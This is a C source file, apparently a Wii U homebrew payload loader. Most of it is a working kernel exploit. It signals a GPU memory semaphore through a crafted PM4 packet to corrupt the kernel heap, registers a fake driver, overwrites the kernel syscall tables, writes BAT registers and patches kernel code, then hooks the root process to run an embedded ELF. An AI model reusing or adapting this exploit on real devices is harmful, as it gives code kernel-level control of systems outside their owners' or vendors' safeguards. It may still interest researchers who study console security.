#include "imports.h"
#include "main_hook.h"
#include "elf_abi.h"
#include "elf_loader.h"

#include <string.h>

#define AFF_CPU0            (1 << 0)
#define AFF_CPU1            (1 << 1)
#define AFF_CPU2            (1 << 2)

#define ROOTRPX_DBAT0U_VAL                          0xC00003FF
#define COREINIT_DBAT0U_VAL                         0xC20001FF

#define ROOTRPX_DBAT0L_VAL                          0x30000012
#define COREINIT_DBAT0L_VAL                         0x32000012

#define KERNEL_SYSCALL_TABLE_1                     	0xFFE84C70
#define KERNEL_SYSCALL_TABLE_2                     	0xFFE85070
#define KERNEL_SYSCALL_TABLE_3                     	0xFFE85470
#define KERNEL_SYSCALL_TABLE_4                     	0xFFEAAA60
#define KERNEL_SYSCALL_TABLE_5                     	0xFFEAAE60

typedef struct _heap_ctxt_t {
	uint32_t base;
	uint32_t end;
	int first_index;
	int last_index;
	uint32_t unknown;
} heap_ctxt_t;

typedef struct _heap_block {
	uint32_t addr;
	uint32_t size;
	uint32_t prev_idx;
	uint32_t next_idx;
} heap_block_t;

typedef struct _OSDriver {
	char name[0x40];
	uint32_t pfid;
	uint32_t save_area;
	struct _OSDriver *next_drv;
} OSDriver;

void _main();
void ppc_kernel_exploit();
void write_main_hook_syscall();
void install_syscall(uint32_t id, void* f);
static void KernelCopyData(unsigned int addr, unsigned int src, unsigned int len);
void InitScreen();
void ClearColor(uint32_t c);
uint32_t make_pm4_type3_packet_header(uint32_t opcode, uint32_t count);

void _entry() {

	InitFuncPtrs();

	void* t1 = MEMAllocFromDefaultHeapEx(0x1000, 64);
	void* s1 = MEMAllocFromDefaultHeapEx(0x10000, 64);

	OSCreateThread(t1, _main, 0, NULL, (uint32_t)s1 + 0x10000, 0x10000, 0, AFF_CPU1 | 8);
	OSResumeThread(t1);

	OSExitThread(0);
	
}

void _main() {

	OSThread* gx2_shutdown_thread = (OSThread*)MEMAllocFromDefaultHeapEx(sizeof(OSThread), 0x20);
	uint32_t* gx2_shutdown_stack  = (uint32_t*)MEMAllocFromDefaultHeapEx(0x1000, 32);

	OSCreateThread(gx2_shutdown_thread, GX2Shutdown, 0, NULL, (uint32_t)gx2_shutdown_stack + 0x1000, 0x1000, 0, 1 << GX2GetMainCoreId());
	OSResumeThread(gx2_shutdown_thread);

	os_sleep(1);

	GX2Init(NULL);

	InitScreen();
	ClearColor(0xFF0000FF);

	ppc_kernel_exploit();
	ClearColor(0x00FF00FF);

	/* Writing "SC_0x09_SETIBAT0(uint32_t upper, uint32_t lower)" as asked in the README: https://github.com/wiiu-env/payload_loader */
	install_syscall(0x26, write_main_hook_syscall);
	Syscall_0x26();
	install_syscall(0x09, (void*)0xFFF02344); // SC_0x09_SETIBAT0(uint32_t upper, uint32_t lower)
	install_syscall(0x34, (void*)0xFFF023D4); // kern_read
	install_syscall(0x35, (void*)0xFFF023F4); // kern_write
	install_syscall(0x25, KernelCopyData);

	ClearColor(0x0000FFFF);
	install_section((uint8_t*)main_hook_elf, ".text");
	install_section((uint8_t*)main_hook_elf, ".data");

	Elf32_Ehdr *ehdr = (Elf32_Ehdr *)main_hook_elf;
	uint32_t hook_instruction = ((ehdr->e_entry & 0x03FFFFFC) | 0x48000003);
	SC_KernelCopyData((void*)(0xC1000000 + 0x0101c56c), &hook_instruction, 4);
	ICInvalidateRange((void*)0x0101c56c, 4);

	ClearColor(0xFFFFFFFF);

	os_usleep(150 * 1000);

	SYSLaunchMiiStudio();
	OSSavesDone_ReadyToRelease();

	OSThread* th_core0 = (OSThread*)MEMAllocFromDefaultHeapEx(sizeof(OSThread), 64);
	uint32_t* st_core0 = (uint32_t*)MEMAllocFromDefaultHeapEx(0x1000, 4);

	OSThread* th_core2 = (OSThread*)MEMAllocFromDefaultHeapEx(sizeof(OSThread), 64);
	uint32_t* st_core2 = (uint32_t*)MEMAllocFromDefaultHeapEx(0x1000, 4);

	GX2Shutdown();

	OSCreateThread(th_core0, OSReleaseForeground, 0, NULL, (uint32_t)(st_core0 + 0x1000), 0x1000, 0, AFF_CPU0);
	OSResumeThread(th_core0);

	OSCreateThread(th_core2, OSReleaseForeground, 0, NULL, (uint32_t)(st_core2 + 0x1000), 0x1000, 0, AFF_CPU2);
	OSResumeThread(th_core2);

	OSReleaseForeground();
	OSExit(0);

}

void ppc_kernel_exploit() {

	uint8_t drivername[8] __attribute__((aligned(0x10))) = {'D', 'R', 'V', 'H', 'A', 'X', 0, 0};
	heap_ctxt_t* virt_kernel_heap_ctxt = (heap_ctxt_t*)0xFF200000;
	heap_ctxt_t* phys_kernel_heap_ctxt = (heap_ctxt_t*)0x1B800000;

	/* Allocate our OSDriver structure */
	OSDriver* driverhax = (OSDriver*)MEMAllocFromDefaultHeapEx(sizeof(OSDriver), 16);

	/* Setup our fake heap block in the userspace at 0x1F200014 */
	heap_block_t *heap_blk = (heap_block_t*)0x1F200014;
	heap_blk->addr = (uint32_t)driverhax;
	heap_blk->size = -sizeof(OSDriver);
	heap_blk->prev_idx = -1;
	heap_blk->next_idx = -1;

	DCFlushRange(heap_blk, 0x10);

	/* Crafting our GPU packet http://developer.amd.com/wordpress/media/2013/10/R6xx_R7xx_3D.pdf */
	/* 0x39 = MEM_SEMAPHORE, takes 2 arguments: */
	/* [1] = ADDRESS_LO -> Lower bits of QWORD-Aligned Address */
	/* [2] = SEM_SEL    -> bits[31:29] | "110" – Signal Semaphore or "111" – Wait Semaphore */
	uint32_t *pm4_packet = (uint32_t *)OSAllocFromSystem(32, 32);
	pm4_packet[0] = make_pm4_type3_packet_header(0x39, 2);
	pm4_packet[1] = (uint32_t)&phys_kernel_heap_ctxt->first_index;
	pm4_packet[2] = 6 << 29;
	for (int i = 0; i < 5; ++i) pm4_packet[3 + i] = 0x80000000;

	DCFlushRange(pm4_packet, 32);

	/* Signal the semaphore twice */
	GX2DirectCallDisplayList(pm4_packet, 32); // += 0x01000000
	GX2DirectCallDisplayList(pm4_packet, 32); // += 0x01000000
	GX2Flush();

	OSDriver_Register((char*)drivername, 6, NULL, NULL);
	
	uint32_t kernel_memcpy_syscall = 0xfff09e44;
	driverhax->save_area = KERNEL_SYSCALL_TABLE_1 + (0x24*4); OSDriver_CopyToSaveArea((char*)drivername, 6, &kernel_memcpy_syscall, 4);
	driverhax->save_area = KERNEL_SYSCALL_TABLE_2 + (0x24*4); OSDriver_CopyToSaveArea((char*)drivername, 6, &kernel_memcpy_syscall, 4);
	driverhax->save_area = KERNEL_SYSCALL_TABLE_3 + (0x24*4); OSDriver_CopyToSaveArea((char*)drivername, 6, &kernel_memcpy_syscall, 4);
	driverhax->save_area = KERNEL_SYSCALL_TABLE_4 + (0x24*4); OSDriver_CopyToSaveArea((char*)drivername, 6, &kernel_memcpy_syscall, 4);
	driverhax->save_area = KERNEL_SYSCALL_TABLE_5 + (0x24*4); OSDriver_CopyToSaveArea((char*)drivername, 6, &kernel_memcpy_syscall, 4);

	uint32_t zero = 0;
	KernelMemcpy(&virt_kernel_heap_ctxt->first_index, &zero, 4); // fix heap integer overflow
	KernelMemcpy((void*)0xFFEAB530, &driverhax->next_drv, 4);    // fix kernel look-up list

}

void write_main_hook_syscall() {

	asm volatile("mfspr %r3, 528; ori %r3, %r3, 0x03; mtspr 528, %r3; mfspr %r3, 530; ori %r3, %r3, 0x03; mtspr 530, %r3; eieio; sync;");

	/* dbatu 5 = 570 | dbatl 5 = 571 */
	asm volatile("mtspr 570, %0;" : : "r" (0xFFF00002));
	asm volatile("mtspr 571, %0;" : : "r" (0xFFF00032));
	asm volatile("eieio; isync;");

	uint32_t *targetAddress = (uint32_t*)0xFFF02344;
	targetAddress[0] = 0x7C0006AC; // eieio
	targetAddress[1] = 0x4C00012C; // isync
	targetAddress[2] = 0x7C7083A6; // mtibatu %r3, 0
	targetAddress[3] = 0x7C9183A6; // mtibatl %r4, 0
	targetAddress[4] = 0x7C0006AC; // eieio
	targetAddress[5] = 0x4C00012C; // isync
	targetAddress[6] = 0x4E800020; // blr

	asm volatile("dcbf 0, %0; icbi 0, %0; sync;" : : "r" (0xFFF02340));
	asm volatile("dcbf 0, %0; icbi 0, %0; sync;" : : "r" (0xFFF02360));	

}

void install_syscall(uint32_t id, void* f) {

	uint32_t kernel_syscall = (uint32_t)f;
	KernelMemcpy((void*)(KERNEL_SYSCALL_TABLE_1 + (id*4)), &kernel_syscall, 4);
	KernelMemcpy((void*)(KERNEL_SYSCALL_TABLE_2 + (id*4)), &kernel_syscall, 4);
	KernelMemcpy((void*)(KERNEL_SYSCALL_TABLE_3 + (id*4)), &kernel_syscall, 4);
	KernelMemcpy((void*)(KERNEL_SYSCALL_TABLE_4 + (id*4)), &kernel_syscall, 4);
	KernelMemcpy((void*)(KERNEL_SYSCALL_TABLE_5 + (id*4)), &kernel_syscall, 4);

}

static void KernelCopyData(unsigned int addr, unsigned int src, unsigned int len)
{
    /*
     * Setup a DBAT access for our 0xC0800000 area and our 0xBC000000 area which hold our variables like GAME_LAUNCHED and our BSS/rodata section
     */
    register unsigned int dbatu0, dbatl0, target_dbat0u = 0, target_dbat0l = 0;
    // setup mapping based on target address
    if ((addr >= 0xC0000000) && (addr < 0xC2000000)) // root.rpx address
    {
        target_dbat0u = ROOTRPX_DBAT0U_VAL;
        target_dbat0l = ROOTRPX_DBAT0L_VAL;
    }
    else if ((addr >= 0xC2000000) && (addr < 0xC3000000))
    {
        target_dbat0u = COREINIT_DBAT0U_VAL;
        target_dbat0l = COREINIT_DBAT0L_VAL;
    }
    // save the original DBAT value
    asm volatile("mfdbatu %0, 0" : "=r" (dbatu0));
    asm volatile("mfdbatl %0, 0" : "=r" (dbatl0));
    asm volatile("mtdbatu 0, %0" : : "r" (target_dbat0u));
    asm volatile("mtdbatl 0, %0" : : "r" (target_dbat0l));
    asm volatile("eieio; isync");

    unsigned char *src_p = (unsigned char*)src;
    unsigned char *dst_p = (unsigned char*)addr;

    unsigned int i;
    for(i = 0; i < len; i++)
    {
        dst_p[i] = src_p[i];
    }

    unsigned int flushAddr = addr & ~31;

    while(flushAddr < (addr + len))
    {
        asm volatile("dcbf 0, %0; sync" : : "r"(flushAddr));
        flushAddr += 0x20;
    }

    /*
     * Restore original DBAT value
     */
    asm volatile("mtdbatu 0, %0" : : "r" (dbatu0));
    asm volatile("mtdbatl 0, %0" : : "r" (dbatl0));
    asm volatile("eieio; isync");

}

void InitScreen() {

	OSScreenInit();
	int a = OSScreenGetBufferSizeEx(0);

	OSScreenSetBufferEx(0, (void*)(0xF4800000 + 0));
	OSScreenSetBufferEx(1, (void*)(0xF4800000 + a));

	OSScreenEnableEx(0, 1);
	OSScreenEnableEx(1, 1);

}

void ClearColor(uint32_t c) {

	for(int i = 0; i < 2; i++) {
		OSScreenClearBufferEx(0, c);
		OSScreenClearBufferEx(1, c);

		OSScreenFlipBuffersEx(0);
		OSScreenFlipBuffersEx(1);
	}
}

uint32_t make_pm4_type3_packet_header(uint32_t opcode, uint32_t count) {	
	return (3 << 30) | ((count-1) << 16) | (opcode << 8);
}